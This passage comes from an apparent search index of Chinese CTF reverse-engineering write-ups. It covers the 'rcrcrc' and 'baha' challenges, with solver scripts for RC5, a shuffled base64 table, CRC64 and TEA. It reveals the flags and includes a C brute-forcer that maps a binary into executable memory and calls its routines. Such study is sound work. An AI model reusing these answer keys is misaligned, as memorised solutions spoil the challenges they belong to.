b & 0x1f )) | ( a << ( 32 - b & 0x1f ))) & 0xffffffff ; } int main () { int i , j ; for ( i = 2 ; i >= 0 ; i -= 2 ) { unsigned int a = key [ i ]; unsigned int b = key [ i + 1 ]; for ( j = 11 ; j >= 0 ; j -- ) { b -= T [ 2 * i + 1 ]; b = func ( b , a ) ^ a ; a -= T [ 2 * i ]; a = func ( a , b ) ^ b ; } key [ i ] = a - 0xd24aaa79 ; key [ i + 1 ] = b - 0x0bf82ac7 ; } printf ( \"%s\" , key ); }","title":"\u89e3\u9898\u601d\u8def"},{"location":"WriteUp/201905/Reverse/#rcrcrcdondayoo-wp","text":"Linux \u7a0b\u5e8f\uff0c\u5148\u8fd0\u884c\u770b\u770b \u7a0b\u5e8f\u6ca1\u6709\u4efb\u4f55\u8f93\u51fa\uff0c\u968f\u4fbf\u8f93\u5165\u5b57\u7b26\uff0c\u7a0b\u5e8f\u9000\u51fa\uff0cIDA64 \u6253\u5f00\u5206\u6790 main \u51fd\u6570\u4e2d\u6709 scanf \u548c\u51e0\u4e2a\u53d8\u91cf\u5b9a\u4e49\uff0c\u6700\u7ec8\u5224\u65ad\u56db\u4e2a\u53d8\u91cf\u503c\u662f\u5426\u6b63\u786e \u5148\u8fdb\u5165 400894 \u67e5\u770b \u5176\u4e2d ROL \u548c\u90e8\u5206\u53d8\u91cf\u7684\u540d\u5b57\u662f\u6211\u81ea\u5df1\u4fee\u6539\u8fc7\u7684\uff0c\u70b9\u5f00 ROL \u5f88\u5bb9\u6613\u5206\u6790\u51fa\u8fd9\u662f\u5faa\u73af\u5de6\u79fb\u51fd\u6570 \u770b\u5230 \u8fd9\u6837\u7684\u7ed3\u6784\uff0c\u518d\u7ed3\u5408\u9898\u76ee\u540d\u5b57\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u65ad\u5b9a\u8fd9\u662f\u4e00\u4e2a RC5 \u52a0\u5bc6\u7a0b\u5e8f\uff0c\u518d\u8fdb\u5165 4006FC \u67e5\u770b \u53ef\u4ee5\u786e\u5b9a\u662f RC5 \u52a0\u5bc6\uff0c\u4e00\u4e2a\u5206\u7ec4\u662f int\uff0c\u4e5f\u5c31\u662f 32 \u4f4d\uff0c\u505a 12 \u8f6e\u5faa\u73af\uff0c400894 \u662f\u5bc6\u94a5\u6269\u5c55\u51fd\u6570\uff0c4006FC \u662f\u52a0\u5bc6\u51fd\u6570\uff0c\u9644\u4e24\u9875 ppt \u4f46\u4e0e\u4e00\u822c\u7684 RC5 \u4e0d\u540c\u7684\u662f\uff0c\u7a0b\u5e8f\u6bcf\u4e00\u8f6e\u4f7f\u7528\u7684\u5b50\u5bc6\u94a5\u662f\u4e00\u6837\u7684 \u5faa\u73af\u53d8\u91cf j \u4f5c\u4e3a\u5bc6\u94a5\u6570\u7ec4\u7d22\u5f15\uff0c\u6ca1\u6709\u4fee\u6539 \u8981\u8fdb\u884c\u89e3\u5bc6\uff0c\u9996\u5148\u8981\u83b7\u5f97\u4f7f\u7528\u7684\u5b50\u5bc6\u94a5\uff0c\u5728\u8fd9\u91cc\u65e0\u9700\u5bf9\u5bc6\u94a5\u6269\u5c55\u51fd\u6570\u8fdb\u884c\u5206\u6790\uff0c\u76f4\u63a5\u5728\u52a8\u6001\u8c03\u8bd5\u4e2d\u4ece\u5185\u5b58 dump \u51fa\u5404\u4e2a\u5b50\u5bc6\u94a5\u5373\u53ef \u53ef\u4ee5\u5f97\u5230 4 \u4e2a\u5b50\u5bc6\u94a5 0xd24aaa79,0x0bf82ac7,0xeb5a5436,0x04fc4110 \u6309\u7167\u5bc6\u94a5\u7684\u4f7f\u7528\u987a\u5e8f\uff0c\u7f16\u5199\u89e3\u5bc6\u7a0b\u5e8f import libnum def ror ( num , d ): tmp = num >> ( d & 0x1f ) return tmp | (( num << ( 32 - ( d & 0x1f ))) & 2 ** 32 - 1 ) s = [ 0xd24aaa79 , 0x0bf82ac7 , 0xeb5a5436 , 0x04fc4110 ] cipher = [ 0xf4a956bf , 0xba568f3d , 0xd73a7f7c , 0x817f532b ] message = [] for r in range ( 0 , 3 , 2 ): ld = cipher [ r ] rd = cipher [ r + 1 ] for rnd in range ( 12 ): rd = ror (( rd - s [ r + 1 ]) & 2 ** 32 - 1 , ld ) ^ ld ld = ror (( ld - s [ r ]) & 2 ** 32 - 1 , rd ) ^ rd rd = ( rd - s [ 1 ]) & 2 ** 32 - 1 ld = ( ld - s [ 0 ]) & 2 ** 32 - 1 message . append ( libnum . n2s ( ld )) message . append ( libnum . n2s ( rd )) print ( message ) \u8fd0\u884c\u5f97\u5230 \u4f3c\u4e4e\u4e0d\u662f\u53ef\u8bfb\u7684\u5b57\u7b26\u4e32\uff0c\u4f46\u786e\u5b9e\u90fd\u843d\u5728 ASCII \u8303\u56f4\u5185\uff0c\u770b\u4e86\u534a\u5929\uff0c\u6ce8\u610f\u5230 linux \u662f\u5c0f\u7aef\u4f4d\u5e8f\uff0c\u8fd9\u4e2a\u7ed3\u679c\u4e5f\u662f\u5c0f\u7aef\u65b9\u5f0f\u8f93\u51fa\u7684\uff0c\u5b9e\u9645 flag \u5e94\u8be5\u5012\u8fc7\u6765 rc5_fking_boring","title":"rcrcrc(dondayoo~\u6218\u961f wp)"},{"location":"WriteUp/201905/Reverse/#baha","text":"","title":"baha"},{"location":"WriteUp/201905/Reverse/#_7","text":"base64 \u7b97\u6cd5\u9006\u5411 \u7206\u7834\u54c8\u5e0c\u7b97\u6cd5","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"WriteUp/201905/Reverse/#_8","text":"\u9996\u5148\u9006\u5411 base64\uff0c\u4f7f\u7528\u968f\u673a\u6570\u6253\u4e71\u4e86\u539f\u59cb\u7d22\u5f15\u8868\uff0c\u4f46\u662f\u968f\u673a\u6570\u7ed3\u679c\u4f7f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u751f\u6210\u7684\u65b0\u7d22\u5f15\u8868\u4e5f\u56fa\u5b9a\u3002 base64 \u89e3\u5bc6\u811a\u672c\u5982\u4e0b\uff1a key = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' T = 'kEjTmtB3VtHvgs51kl5v' b = '' for i in T : if i == '=' : b += '000000' break tmp = key . find ( i ) tmp = bin ( tmp )[ 2 :] if not len ( tmp ) == 0 : if len ( tmp ) < 6 : for _ in range ( 6 - len ( tmp )): b += '0' b += tmp j = 0 for i in range ( 0 , len ( b ), 8 ): print ( chr ( int ( b [ i : i + 8 ], 2 )), end = '' ) j += 1 \u7136\u540e\u662f\u7206\u7834\u8f93\u5165\u4e3a 9 \u4f4d\u6570\u5b57\u7684\u54c8\u5e0c\u51fd\u6570\uff0c\u5927\u4f6c\u4eec\u592a\u5f3a\u4e86\uff0c\u76f4\u63a5\u628a\u51fd\u6570\u590d\u539f\u4e86\uff0c\u9884\u671f\u89e3\u5982\u4e0b //#include \"stdafx.h\" #include <windows.h> #include <stdio.h> typedef __int64 ( * func )(); int main () { //char * hmod = (char *)LoadLibraryA(\"C:\\\\Users\\\\hgy\\\\Desktop\\\\hxb\\\\reverse_1\\\\reverse.exe\"); FILE * fp ; fp = fopen ( \"./baha.exe\" , \"rb\" ); size_t len = 0 ; fseek ( fp , 0 , SEEK_END ); len = ftell ( fp ); fseek ( fp , 0 , SEEK_SET ); char * hmod = ( char * ) VirtualAllocEx ( GetCurrentProcess (), 0 , len , MEM_COMMIT , PAGE_EXECUTE_READWRITE ); fread ( hmod , len , 1 , fp ); func hash = ( func ) & hmod [ 0x560 ]; unsigned long long res ; char flag [ 0x30 ] = \"b@sE2019_scucs_\" ; for ( flag [ 15 ] = '0' ; flag [ 15 ] < '0' + 10 ; flag [ 15 ] ++ ) for ( flag [ 16 ] = '0' ; flag [ 16 ] < '0' + 10 ; flag [ 16 ] ++ ) for ( flag [ 17 ] = '0' ; flag [ 17 ] < '0' + 10 ; flag [ 17 ] ++ ) for ( flag [ 18 ] = '0' ; flag [ 18 ] < '0' + 10 ; flag [ 18 ] ++ ) { for ( flag [ 19 ] = '0' ; flag [ 19 ] < '0' + 10 ; flag [ 19 ] ++ ) for ( flag [ 20 ] = '0' ; flag [ 20 ] < '0' + 10 ; flag [ 20 ] ++ ) for ( flag [ 21 ] = '0' ; flag [ 21 ] < '0' + 10 ; flag [ 21 ] ++ ) for ( flag [ 22 ] = '0' ; flag [ 22 ] < '0' + 10 ; flag [ 22 ] ++ ) for ( flag [ 23 ] = '0' ; flag [ 23 ] < '0' + 10 ; flag [ 23 ] ++ ) { unsigned int addr = ( unsigned int ) flag ; __asm { mov ecx , addr } res = hash (); if ( res == 0x8181433626e17720 ) { printf ( \"found: %s\" , flag ); exit ( 0 ); } } printf ( \"%s -- %#llx \\n \" , flag , res ); } return 0 ; } \u8fd9\u91cc\u6709\u4e2a\u5c0f\u5751\u662f\uff0c\u54c8\u5e0c\u51fd\u6570\u91c7\u7528_thiscall \u8c03\u7528\u7684\uff0c\u6240\u4ee5\u6211\u7528\u7684\u5185\u8054\u6c47\u7f16\u7ed9\u51fd\u6570\u4f20\u7684\u53c2\u6570\u3002\u4e0d\u8fc7\u5927\u4f6c\u4eec\u76f4\u63a5\u590d\u539f\u4e86\u51fd\u6570\uff0c\u4e5f\u5c31\u6ca1\u8fd9\u4e9b\u95ee\u9898\u4e86 2333.","title":"\u89e3\u9898\u601d\u8def"},{"location":"WriteUp/201905/Reverse/#bahadondayoo-wp","text":"Windows \u7a0b\u5e8f\uff0c\u8fd0\u884c\u770b\u770b \u4e24\u6bb5\u8f93\u5165\uff0c\u6709\u9519\u8bef\u63d0\u793a\uff0cIDA \u6253\u5f00\u5206\u6790 \u6ca1\u6709 main \u7b26\u53f7\uff0c\u641c\u7d22\u5b57\u7b26\u4e32 Welcome \u8fdb\u5165 main \u51fd\u6570\u67e5\u770b \u5176\u4e2d\u90e8\u5206\u53d8\u91cf\u540d\u548c\u51fd\u6570\u540d\u662f\u81ea\u5df1\u4fee\u6539\u8fc7\u7684\uff0c\u7a0b\u5e8f\u9996\u5148\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5bf9\u7b2c\u4e8c\u6b21\u8f93\u5165\u8fdb\u884c\u5224\u65ad\uff0c\u8fdb\u5165 check_is_number \u51fd\u6570\u67e5\u770b \u6bd4\u8f83\u660e\u663e\u7684\u662f\u4e0e 48+9=57\uff0c\u4e5f\u5c31\u662f\u20199\u2019\u7684 ASCII \u7801\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u5f97\u77e5\u8fd9\u4e2a\u51fd\u6570\u662f\u5224\u65ad\u662f\u5426\u4e3a\u6570\u5b57\u5b57\u7b26\u4e32\uff0c\u4f46 strlen \u8fd8\u4e0d\u592a\u6e05\u6670 \u6ce8\u610f\u5230\u8fd9\u91cc\u7684\u53f3\u79fb 6 \u4f4d\uff0c&3F \u7b49\u64cd\u4f5c\uff0c\u518d\u7ed3\u5408 abcdefg \u53d8\u91cf \u80fd\u591f\u5224\u65ad\u8fd9\u662f\u4e00\u4e2a base64 \u7f16\u7801\uff0c\u800c \u5176\u4e2d\u7684\u5b57\u7b26\u4e32\u662f base64 \u7f16\u7801\u7684\u7ed3\u679c \u4f46\u662f\u76f4\u63a5\u53d6\u51fa\u6765\u8fdb\u884c base64 \u89e3\u7801\u53d1\u73b0\u5e76\u4e0d\u662f\u53ef\u8bfb\u5b57\u7b26\u4e32\uff0c\u6ce8\u610f\u5230 sub_401000() \u8fd9\u4e2a\u51fd\u6570\u5bf9 base64 \u7f16\u7801\u8868\u8fdb\u884c\u4e86\u6253\u4e71\uff0c\u4e0a\u52a8\u6001\u8c03\u8bd5\uff0c\u76f4\u63a5 dump \u51fa\u6253\u4e71\u7684\u7f16\u7801\u8868 \u7f16\u5199\u811a\u672c\uff0c\u67e5\u8868\u8fd8\u539f\u771f\u6b63\u7684 base64 \u7f16\u7801 origin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' modified = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' key_enc = 'kEjTmtB3VtHvgs51kl5v' key = '' for ch in key_enc : key += origin [ modified . index ( ch )] print ( key ) \u8fd9\u4e2a\u5c31\u662f\u7b2c\u4e00\u6b21\u8f93\u5165\u7684 name\uff0c\u63a5\u4e0b\u6765\u770b phone \u8fd9\u4e00\u6bb5\u5c06 name \u548c phone \u8fde\u63a5\u5230\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u603b\u957f\u5ea6\u662f 24\uff0c\u6240\u4ee5 phone \u7684\u957f\u5ea6\u5e94\u8be5\u662f 9 \u7136\u540e\u770b\u6700\u540e\u7684\u5224\u65ad \u8fdb\u5165\u51fd\u6570\u67e5\u770b \u51fd\u6570\u5185\u6709\u4e09\u6bb5\u5faa\u73af\uff0c\u7b2c\u4e00\u6bb5\u5faa\u73af\u662f 32 \u4f4d\u5e38\u91cf\u7684\u5f02\u6216\u64cd\u4f5c\uff0c\u7b2c\u4e8c\u6bb5\u5faa\u73af\u662f\u67e5\u8868\u64cd\u4f5c\uff0c\u7b2c\u4e09\u6bb5\u5faa\u73af\u7279\u5f81\u6bd4\u8f83\u660e\u663e\uff0c\u6709>>5, \u00d716\uff0c\u4e5f\u5c31\u662f<<4 \u64cd\u4f5c\uff0c\u5e76\u4e14\u6709-0x61c88647= 0x9e3779b9 \u5e38\u91cf\uff0c\u662f\u4e00\u4e2a tea \u52a0\u5bc6 \u7ed3\u5408\u9898\u76ee\u540d\u5b57 baha\uff0cba \u5e94\u8be5\u4ee3\u8868 base64\uff0cha \u6211\u89c9\u5f97\u5e94\u8be5\u662f hash\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6bb5\u5faa\u73af\u5e94\u8be5\u662f\u4e00\u4e2a hash \u7b97\u6cd5\uff0c\u800c\u7528\u67e5\u8868\u65b9\u5f0f\u7684 hash \u7b97\u6cd5\uff0c\u4e00\u822c\u5c31\u662f crc \u4e86\u3002\u4ed4\u7ec6\u5206\u6790\u4ee3\u7801\uff0c\u9996\u5148\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u4e0e\u521d\u59cb\u5bc4\u5b58\u5668\u5f02\u6216\u5f97\u5230\u7d22\u5f15\u503c\uff0c\u5bc4\u5b58\u5668\u53f3\u79fb 8 \u4f4d\u3002\u901a\u8fc7\u7d22\u5f15\u67e5\u8868\u5f97\u5230\u67d0\u4e2a\u503c\uff0c\u518d\u4e0e\u5bc4\u5b58\u5668\u5f02\u6216\uff0c\u5bc4\u5b58\u5668\u957f\u5ea6\u662f\u4e24\u4e2a\u53cc\u5b57\uff0c\u6240\u4ee5\u662f\u4e00\u4e2a\u67e5\u8868\u6cd5 crc64 \u7b2c\u4e00\u6bb5\u5faa\u73af\u5c31\u662f\u751f\u6210\u8868\u7684\u64cd\u4f5c\uff0c\u540c\u6837\u76f4\u63a5\u5728\u52a8\u6001\u8c03\u8bd5\u4e2d dump \u51fa\u8fd9\u5f20\u8868\u5373\u53ef \u6709\u4e86\u8868\u540e\uff0c\u9700\u8981\u9006\u5411\u6062\u590d\u51fa 9 \u4e2a\u5b57\u8282\u5185\u5bb9\uff0c\u56e0\u4e3a crc64 \u7684\u957f\u5ea6\u662f 8 \u5b57\u8282\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u5b57\u8282\u53ea\u80fd\u731c\u6d4b\uff0c\u8303\u56f4\u4e5f\u6bd4\u8f83\u5c0f\uff0c\u5728\u6570\u5b57\u5b57\u7b26\u8303\u56f4\u5185 \u6062\u590d\u7684\u65b9\u6cd5\u53c2\u8003\u4e86https://blog.csdn.net/dabang_007/article/details/48713659 \u56e0\u4e3a\u6b63\u5411\u8ba1\u7b97\u65f6\u5bc4\u5b58\u5668\u5148\u903b\u8f91\u53f3\u79fb 8 \u4f4d\uff0c\u518d\u4e0e\u4e00\u4e2a 8 \u5b57\u8282\u5f02\u6216\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e0e\u67e5\u8868\u5f97\u5230\u7684\u503c\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u76f8\u7b49\uff0c\u5229\u7528\u8fd9\u4e2a\u53ef\u4ee5\u5f97\u5230\u8868\u4e2d\u8fd9\u4e00\u4e2a 8 \u5b57\u8282\u5b57\u7684\u7d22\u5f15\u3002\u5f97\u5230\u7b2c\u4e00\u4e2a 8 \u5b57\u8282\u5b57\u540e\uff0c\u5bc4\u5b58\u5668\u5148\u4e0e\u8fd9\u4e2a\u5b57\u5f02\u6216\uff0c\u518d\u5de6\u79fb 8 \u4f4d\uff0c\u7136\u540e\u91cd\u590d\u7b2c\u4e00\u6b21\u64cd\u4f5c\uff0c\u4e00\u5171\u53ef\u4ee5\u5f97\u5230 8 \u4e2a 8 \u5b57\u8282\u5b57\u7684\u7d22\u5f15\u3002 \u6839\u636e\u8fd9\u4e9b\u7d22\u5f15\u53f7\uff0c\u904d\u5386\u6240\u6709\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0c\u8fdb\u884c\u4e00\u6b21\u6b63\u5411\u8ba1\u7b97\uff0c\u7ea6\u675f\u540e\u516b\u4e2a\u5b57\u8282\u7684\u8f93\u5165\u5fc5\u987b\u4f7f\u5f97\u67e5\u8868\u65f6\u7684\u7d22\u5f15\u53f7\u662f\u6240\u671f\u671b\u7684\u503c\uff0c\u5c31\u80fd\u5f97\u5230\u6bcf\u4e00\u79cd\u7b26\u5408\u6761\u4ef6\u7684\u8f93\u5165\u3002 Tea \u7684\u89e3\u5bc6\u6bd4\u8f83\u5bb9\u6613\uff0c\u5c06+\u6539\u4e3a-\uff0c\u987a\u5e8f\u8c03\u6362\u5373\u53ef\u3002 \u6700\u540e\u7f16\u5199\u811a\u672c origin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' modified = 'pj+Oh2IXB6dyV5ArzmDtML0ZkeqPgwfvJbaSEHnxUY79K4Go3u/TC1sl8iFQWcNR' key_enc = 'kEjTmtB3VtHvgs51kl5v' key = '' for ch in key_enc : key += origin [ modified . index ( ch )] print ( key ) name = 'b@sE2019_scucs_' phone = '' num = '0123456789' data = [ 0 , 0 , 0x30358979 , 0x7AD870C8 , 0x606B12F2 , 0xF5B0E190 , 0x505E9B8B , 0x8F689158 , 0x9841B68F , 0xC038E573 , 0xA8743FF6 , 0xBAE095BB , 0xF82AA47D , 0x358804E3 , 0xC81F2D04 , 0x4F50742B , 0x6814FE75 , 0xAB28ECB4 , 0x5821770C , 0xD1F09C7C , 0x087FEC87 , 0x5E980D24 , 0x384A65FE , 0x24407DEC , 0xF05548FA , 0x6B1009C7 , 0xC060C183 , 0x11C8790F , 0x903E5A08 , 0x9EA0E857 , 0xA00BD371 , 0xE478989F , 0x88BE6F81 , 0x7D08FF3B , 0xB88BE6F8 , 0x07D08FF3 , 0xE8D57D73 , 0x88B81EAB , 0xD8E0F40A , 0xF2606E63 , 0x10FFD90E , 0xBD301A48 , 0x20CA5077 , 0xC7E86A80 , 0x7094CBFC , 0x4880FBD8 , 0x40A14285 , 0x32588B10 , 0xE0AA91F4 , 0xD620138F , 0xD09F188D , 0xACF86347 , 0x80C18306 , 0x2390F21F , 0xB0F40A7F , 0x594882D7 , 0x78EB277B , 0x1618F6FC , 0x48DEAE02 , 0x6CC08634 , 0x18803589 , 0xE3A8176C , 0x28B5BCF0 , 0x997067A4 , 0x117CDF02 , 0xFA11FE77 , 0x2149567B , 0x80C98EBF , 0x7117CDF0 , 0x0FA11FE7 , 0x41224489 , 0x75796F2F , 0x893D698D , 0x3A291B04 , 0xB908E0F4 , 0x40F16BCC , 0xE9567B7F , 0xCF99FA94 , 0xD963F206 , 0xB5418A5C , 0x79682177 , 0x513912C3 , 0x495DA80E , 0x2BE1620B , 0x19033385 , 0xA489F353 , 0x2936BAFC , 0xDE51839B , 0xE12997F8 , 0x9101F7B0 , 0xD11C1E81 , 0xEBD98778 , 0x8142850A , 0x64B11620 , 0xB1770C73 , 0x1E6966E8 , 0x99C2B083 , 0x8719014C , 0xA9F739FA , 0xFDC17184 , 0xF9A9A271 , 0x72A9E0DC , 0xC99C2B08 , 0x08719014 , 0x0183060C , 0x4721E43F , 0x31B68F75 , 0x3DF994F7 , 0x61E814FE , 0xB29105AF , 0x51DD9D87 , 0xC8497567 , 0xF1D64EF6 , 0x2C31EDF8 , 0xC1E3C78F , 0x56E99D30 , 0x91BD5C04 , 0xD9810C68 , 0xA188D57D , 0xA3597CA0 , 0x6997F879 , 0xEC09088B , 0x59A27100 , 0x96D17843 , 0x09FCEA8B , 0x19B9E91B , 0x39C963F2 , 0x636199D3 , 0x7A6E2D6F , 0xDF7ADABD , 0x4A5BA416 , 0xA5A2AA75 , 0x1A053F9D , 0x2ACA3B2D , 0x2A30B6E4 , 0x50124BE5 , 0xE22F9BE0 , 0x1F423FCE , 0xD21A1299 , 0x659A4F06 , 0x82448912 , 0xEAF2DE5E , 0xB271006B , 0x902AAE96 , 0x127AD31A , 0x74523609 , 0x224F5A63 , 0x0E8A46C1 , 0x7211C1E8 , 0x81E2D799 , 0x42244891 , 0xFB3AA751 , 0x8A3B6595 , 0xB46AD37A , 0xBA0EECEC , 0xCEB2A3B2 , 0xEA507767 , 0x41DA32EA , 0xDA65FE1E , 0x3B024222 , 0xF2D042EE , 0xA2722586 , 0xC2E5CB97 , 0xD8AA554E , 0x92BB501C , 0x57C2C416 , 0xA28ED965 , 0x2D1AB4DE , 0x6A91F461 , 0x624AC0F5 , 0x5AA47D18 , 0x1892B03D , 0x0AFAE693 , 0x97FA2165 , 0x3ACF6FEA , 0xED2251AD , 0x9AC4BC9B , 0x095AC932 , 0xAAF135E2 , 0x7382B9FA , 0xFAAFAE69 , 0xFCEA28A2 , 0xCA9A2710 , 0x8632586A , 0x02850A14 , 0xC9622C41 , 0x32B0836D , 0xB3BA5C89 , 0x62EE18E6 , 0x3CD2CDD1 , 0x52DB919F , 0x460ABD19 , 0x6B12F26D , 0x256B24CA , 0x5B277B14 , 0x5FB35402 , 0x0B79E09F , 0xD0DBC55A , 0x3B4C69E6 , 0xAA03B592 , 0xF35344E2 , 0xE553C1B9 , 0xC366CD9B , 0x9F8BB171 , 0x93385610 , 0x10E32029 , 0xA30DDF69 , 0x6A3B50E1 , 0x03060C18 , 0x8E43C87E , 0x33338561 , 0xF49BB8B6 , 0x636D1EEA , 0x7BF329EE , 0x53589793 , 0x012B5926 , 0x9B47BA97 , 0x4E7B2D0D , 0xAB7233EE , 0x34A35DC5 , 0xFB2CA865 , 0xBBCBCC9D , 0xCB19211C , 0xC113BC55 , 0xE3AC9DEC , 0x5863DBF1 , 0xD3991495 , 0x22BBAB39 , 0x83C78F1E , 0xADD33A61 , 0xB3F20667 , 0xD70B4AA9 , 0x7BED2B63 , 0x985B3E82 , 0x4BD8A21A , 0xE2834E4A , 0x1B863991 , 0x6DEBDF12 , 0x2BB3B0E8 , 0x1733AFDA , 0x8BB86399 , 0xF34B3745 , 0xBB8DEAE0 , 0x8993478D , 0xEBD3716B , 0x06FBD6D5 , 0xDBE6F812 , 0x7C23A61D , 0x13F9D516 , 0x3373D236 , 0x23CC5C6F , 0x49ABA2FE , 0x7392C7E4 , 0xC6C333A6 , 0x43A74E9D , 0xBC1B436E , 0xAC4BC9B5 , 0x95AC9329 , 0x9C7E40CC , 0xEF74E3E1 , 0xCC20DB47 , 0x601C72B9 , 0xFC15523E , 0x1AC40271 , 0x340A7F3A , 0x5594765A , 0x043FF643 , 0x2F4C0692 , 0x54616DC8 , 0xA02497CA , 0x6454E4B1 , 0xDAFCE702 , 0xC45F37C0 , 0x3E847F9D , 0xF46ABEB9 , 0x445C0F55 , 0xA4342532 , 0xCB349E0D , 0x9401AC4B , 0xB1ECEEC5 , 0x5C1E814F , 0xFEBC9AEE , 0x6C2B0836 , 0x8464EA26 , 0x3C7593BD , 0x0B0C7B7E , 0x0C401AC4 , 0x71D40BB6 , 0x24F5A634 , 0xE8A46C12 , 0x14C02F4D , 0x927C1CDA , 0x449EB4C6 , 0x1D148D82 , 0x74AB3DBF , 0x67CCFD4A , 0xBCB410BB , 0x289C8961 , 0x8C8199C2 , 0x5244F9A9 , 0xDCDF0249 , 0xDD2C68F1 , 0xECEA8B30 , 0xA7F41839 , 0x4CE15841 , 0x438C80A6 , 0x7CD4D138 , 0x3954F06E , 0x2C8A4AB3 , 0xB63C6136 , 0x1CBFC3CA , 0xCCE411FE , 0xD4A0EECE , 0x83B465D5 , 0xE49567B7 , 0xF96C151D , 0xB4CBFC3C , 0x76048445 , 0x84FE7545 , 0x0CDCF48D , 0xBD3716B7 , 0x6FBD6D5E , 0x8D029FCE , 0x15651D96 , 0xDD5C0445 , 0x9A0D8CCE , 0xED698D3C , 0xE0D5FC06 , 0x2576A038 , 0xAF85882D , 0x15432941 , 0xD55DF8E5 , 0x451DB2CA , 0x5A3569BD , 0x75283BB3 , 0x20ED1975 , 0xD523E8C2 , 0xC49581EA , 0xE51661BB , 0xBE4DF122 , 0xB548FA30 , 0x3125607A , 0x857D7349 , 0x4BFD10B2 , 0x4D625E4D , 0x04AD6499 , 0x7D57D734 , 0x7E751451 , 0x2D094CBF , 0xF11D8509 , 0x1D3CC5C6 , 0x8BC5F5C1 , 0x35897936 , 0x12B59265 , 0x05BCF04F , 0x686DE2AD , 0x55E26BC4 , 0xE70573F5 , 0x65D7E2BD , 0x9DDD033D , 0xADC8CFB9 , 0xD28D7716 , 0x9DFD46C0 , 0xA85507DE , 0xCDA3DD4B , 0x273D9686 , 0xFD965432 , 0x5DE5E64E , 0x5D9D8743 , 0xB99D7ED1 , 0x6DA80E3A , 0xC3450E19 , 0x3DF695B1 , 0x4C2D9F41 , 0x0DC31CC8 , 0x36F5EF89 , 0xC5DC31CC , 0x79A59BA2 , 0xF5E9B8B5 , 0x037DEB6A , 0xA5B7233E , 0x8C157A32 , 0x9582AA47 , 0xF6CD0AFA , 0xD625E4DA , 0x4AD64994 , 0xE6106DA3 , 0x300E395C , 0xB64EF628 , 0xBF66A804 , 0x867B7F51 , 0xC5BED8CC , 0x4E645255 , 0x8AEEACE7 , 0x7E51DB2C , 0xF036DC2F , 0x2E0F40A7 , 0x7F5E4D77 , 0x1E3AC9DE , 0x05863DBF , 0xBE311AAF , 0xE1FEA520 , 0x8E0493D6 , 0x9B26D5E8 , 0xDE5A085D , 0x144E44B0 , 0xEE6F8124 , 0x6E963478 , 0x2670AC20 , 0x21C64053 , 0x16452559 , 0x5B1E309B , 0x461BBED2 , 0xD476A1C3 , 0x762E37AB , 0xAEAED10B , 0x5E9B8B5B , 0x37DEB6AF , 0x6EAE0222 , 0x4D06C667 , 0x3EF099A9 , 0xC26E573F , 0x0EC510D0 , 0xB8B627F7 , 0xC6DA3DD4 , 0xF7E653DC , 0xF6EFB4AD , 0x8D3E2314 , 0xA6B12F26 , 0x0256B24C , 0x9684A65F , 0x788EC284 , 0x368F752E , 0x9CF65A1B , 0x06BAFC57 , 0xE62E2AD3 , 0x56E467DC , 0x6946BB8B , 0x66D1EEA5 , 0x139ECB43 , 0xAECEC3A1 , 0x5CCEBF68 , 0x9EFB4AD8 , 0x2616CFA0 , 0xCEA5D153 , 0xA97E5EF8 , 0xFE90582A , 0xD3A62E30 , 0xC7593BD8 , 0xB0C7B7E3 , 0xF76CB2A1 , 0xCA1FC72B , 0xA732292A , 0x45775673 , 0x9707A053 , 0x3FAF26BB , 0x5F188D57 , 0x70FF5290 , 0x6F2D042E , 0x0A272258 , 0x3F739FA5 , 0x854FB300 , 0x0F4616DC , 0xFF97C3C8 , 0xAF4DC5AD , 0x1BEF5B57 , 0x9F784CD4 , 0x61372B9F , 0xCF26D75F , 0xEE5FBAC7 , 0xFF135E26 , 0x9487CA0F , 0x370C7322 , 0xDBD7BE24 , 0x0739FA5B , 0xA10FCEEC , 0x576761D0 , 0x2E675FB4 , 0x6752E8A9 , 0x54BF2F7C , 0x4FE75459 , 0xCDCF48D8 , 0x7FD2DD20 , 0xB7173810 , 0x2F8C46AB , 0x387FA948 , 0x1FB9CFD2 , 0x42A7D980 , 0xD7A6E2D6 , 0x0DF7ADAB , 0xE7936BAF , 0x772FDD63 , 0xB7CDF024 , 0xF8474C3B , 0x87F8795D , 0x829F3CF3 , 0x27F3AA2C , 0x66E7A46C , 0x17C62355 , 0x1C3FD4A4 , 0x4798B8DE , 0x935745FC , 0x77AD31A7 , 0xE98F3534 , 0xBFB21CA3 , 0xA6DF411F , 0x8F8795DA , 0xDC0731D7 , 0xDFD90E51 , 0x536FA08F , 0xEFEC8728 , 0x29B7D047 ] k = [ 0x2175da3a , - 0x4c241d25 , 0x149b411 , - 0x2b15395b ] delta = 0x9e3779b9 summary = 0xc6ef3720 result = [ 0x26e17720 , 0x81814336 ] for r in range ( 32 ): result [ 1 ] -= (( summary + result [ 0 ]) & 0xffffffff ) ^ ((( result [ 0 ] >> 5 ) - 0x2b15395b ) & 0xffffffff ) ^ ((( result [ 0 ] << 4 ) + 0x149b411 ) & 0xffffffff ) result [ 1 ] &= 0xffffffff result [ 0 ] -= (( summary + result [ 1 ]) & 0xffffffff ) ^ ((( result [ 1 ] >> 5 ) - 0x4c241d25 ) & 0xffffffff ) ^ ((( result [ 1 ] << 4 ) + 0x2175da3a ) & 0xffffffff ) result [ 0 ] &= 0xffffffff summary -= delta print ( 'ans=' , map ( hex , result )) for ch in name : v14 = origin [ 0 ] 